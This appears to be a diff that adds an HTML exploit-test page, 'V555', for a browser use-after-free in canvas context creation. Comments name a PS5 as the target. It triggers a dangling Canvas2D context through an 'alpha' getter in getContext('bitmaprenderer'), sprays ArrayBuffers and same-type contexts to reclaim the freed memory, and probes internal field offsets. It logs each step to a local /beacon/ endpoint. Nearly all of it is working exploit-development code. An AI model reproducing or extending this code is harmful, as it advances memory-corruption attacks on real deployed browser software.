@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V555</title></head>
+<body style="background:#111;color:#0f0;font:13px monospace;padding:10px">
+<pre id="log"></pre>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+=m+'\n'}
+function b(tag,data){
+  log('[B] '+tag+': '+data);
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/beacon/V555-'+tag+'?d='+encodeURIComponent(String(data).substring(0,400))+'&t='+Date.now(),false);
+    x.send();
+  }catch(e){log('[E] beacon fail: '+e.message)}
+}
+
+function triggerUAF(){
+  var outer=document.createElement('canvas');
+  outer.width=1;outer.height=1;
+  var innerCtx=null;
+  var dict={};
+  Object.defineProperty(dict,'alpha',{
+    get:function(){
+      innerCtx=outer.getContext('2d');
+      return true;
+    }
+  });
+  outer.getContext('bitmaprenderer',dict);
+  return innerCtx;
+}
+
+b('BOOT','V555-minimal-isolation');
+
+// ============================================================
+// HYPOTHESIS: m_hasActiveInspectorCanvasCallTracer reads non-zero
+// from stale freed data, entering CallTracer path which crashes
+// via virtual canvasBaseScriptExecutionContext().
+//
+// TEST PLAN:
+// T1: bare save() — does it crash?
+// T2: save() with GC before — does GC change anything?
+// T3: save() with 1 AB — does reclaim change anything?
+// T4: save() with 50 AB — more reclaim pressure
+// T5: save() with 50 AB WRITTEN 0x00 at CallTracer bool offset
+//     (trying offsets 40-56 where the bool likely lives)
+// T6: same-type alias save() — known working baseline
+// ============================================================
+
+// T1: ABSOLUTE MINIMUM — triggerUAF + save, nothing else
+(function(){
+  var ctx=triggerUAF();
+  ctx.save();
+  b('T1','PASS-bare-save');
+})();
+
+// T2: GC before UAF (but no GC between UAF and save)
+(function(){
+  var jnk=[];
+  for(var i=0;i<100000;i++)jnk.push({a:i});
+  jnk=null;
+  var ctx=triggerUAF();
+  ctx.save();
+  b('T2','PASS-gc-before');
+})();
+
+// T3: UAF + 1 AB(768) + save — AB may reclaim freed slot
+(function(){
+  var ctx=triggerUAF();
+  var ab=new ArrayBuffer(768);
+  ctx.save();
+  b('T3','PASS-1ab');
+})();
+
+// T4: UAF + 50 AB(768) + save — heavier reclaim
+(function(){
+  var ctx=triggerUAF();
+  var abs=[];
+  for(var i=0;i<50;i++)abs.push(new ArrayBuffer(768));
+  ctx.save();
+  b('T4','PASS-50ab');
+})();
+
+// T5: UAF + 50 AB(768) + zero bytes 40-60 in all ABs + save
+// If the crash is from m_hasActiveInspectorCanvasCallTracer being non-zero,
+// and the bool lives around offset 40-56 (CanvasRenderingContext base fields),
+// zeroing those bytes should prevent the CallTracer path.
+// BUT AB is already zero-init... so this only matters if AB DIDN'T reclaim
+// and the freed memory has non-zero at those offsets.
+// Actually — AB IS zero-init so if reclaimed, all bytes are 0 already.
+// If NOT reclaimed, we're writing to the WRONG memory (the AB, not the context).
+// So T5 is really testing: do 50 ABs + save crash?
+(function(){
+  var ctx=triggerUAF();
+  var abs=[];
+  for(var i=0;i<50;i++)abs.push(new ArrayBuffer(768));
+  // ABs are already zero. save() either:
+  // a) operates on freed stale memory (AB didn't reclaim) → stale bool may be non-zero
+  // b) operates on AB zero memory → bool is 0x00 → CallTracer skipped → save succeeds
+  // If T4 crashes but T6 (alias) passes → confirms stale bool theory
+  ctx.save();
+  b('T5','PASS-50ab-v2');
+})();
+
+// T6: Same-type alias (V550 approach) — KNOWN WORKING BASELINE
+// This should ALWAYS pass. If it crashes, the PS5 is broken.
+(function(){
+  var outer1=document.createElement('canvas');
+  outer1.width=1;outer1.height=1;
+  var ctx1=outer1.getContext('2d');
+  // ctx1 is a normal, valid Canvas2D context
+  ctx1.save();
+  b('T6','PASS-normal-save-baseline');
+})();
+
+// T7: Same-type alias via UAF reclaim — V550 approach
+(function(){
+  var outer=document.createElement('canvas');
+  outer.width=1;outer.height=1;
+  var innerCtx=null;
+  var dict={};
+  Object.defineProperty(dict,'alpha',{
+    get:function(){
+      innerCtx=outer.getContext('2d');
+      return true;
+    }
+  });
+  outer.getContext('bitmaprenderer',dict);
+  // innerCtx now dangling. Reclaim with another Canvas2D:
+  var outer2=document.createElement('canvas');
+  outer2.width=1;outer2.height=1;
+  var ctx2=outer2.getContext('2d');
+  // If ctx2 reclaimed innerCtx's slot, innerCtx.save() works on ctx2's data
+  innerCtx.save();
+  b('T7','PASS-alias-save');
+})();
+
+// T8: Read m_unrealizedSaveCount offset without save()
+// Use same-type alias to confirm the context is live, then
+// try save() 5 times and check the count through the alias
+(function(){
+  // Create alias pair
+  var outer=document.createElement('canvas');
+  outer.width=1;outer.height=1;
+  var innerCtx=null;
+  var dict={};
+  Object.defineProperty(dict,'alpha',{
+    get:function(){
+      innerCtx=outer.getContext('2d');
+      return true;
+    }
+  });
+  outer.getContext('bitmaprenderer',dict);
+  // Reclaim with fresh context
+  var outer2=document.createElement('canvas');
+  outer2.width=1;outer2.height=1;
+  var ctx2=outer2.getContext('2d');
+  // Both innerCtx and ctx2 point to the same C++ context (hopefully)
+  // save() through innerCtx, check via ctx2
+  var lwBefore=ctx2.lineWidth;
+  innerCtx.save();
+  innerCtx.save();
+  innerCtx.save();
+  // Now ctx2 should see the saves (m_unrealizedSaveCount=3)
+  // But we can't read m_unrealizedSaveCount directly from JS...
+  // Just verify both are alive
+  var lw1=innerCtx.lineWidth;
+  var lw2=ctx2.lineWidth;
+  b('T8','PASS lwBefore='+lwBefore+' lw1='+lw1+' lw2='+lw2);
+})();
+
+// T9: Critical — is the context ACTUALLY FREED?
+// Do same-type alias, then free the ALIAS canvas too.
+// If context was freed by triggerUAF, the alias canvas creates a NEW context.
+// If context was NOT freed, the alias canvas might get the SAME context.
+// Test: create two separate contexts and compare canvas properties.
+(function(){
+  var outer=document.createElement('canvas');
+  outer.width=50;outer.height=50;
+  var innerCtx=null;
+  var dict={};
+  Object.defineProperty(dict,'alpha',{
+    get:function(){
+      innerCtx=outer.getContext('2d');
+      return true;
+    }
+  });
+  outer.getContext('bitmaprenderer',dict);
+  // innerCtx is dangling (or alive but detached)
+
+  // Check: does innerCtx.canvas still reference outer?
+  var canvasRef='none';
+  try{
+    var c=innerCtx.canvas;
+    canvasRef=c?('tag='+c.tagName+' w='+c.width+' h='+c.height):'null';
+  }catch(e){canvasRef='ERR:'+e.message}
+
+  b('T9','canvas='+canvasRef);
+})();
+
+b('DONE','V555-all-complete');
+</script>
+</body></html>
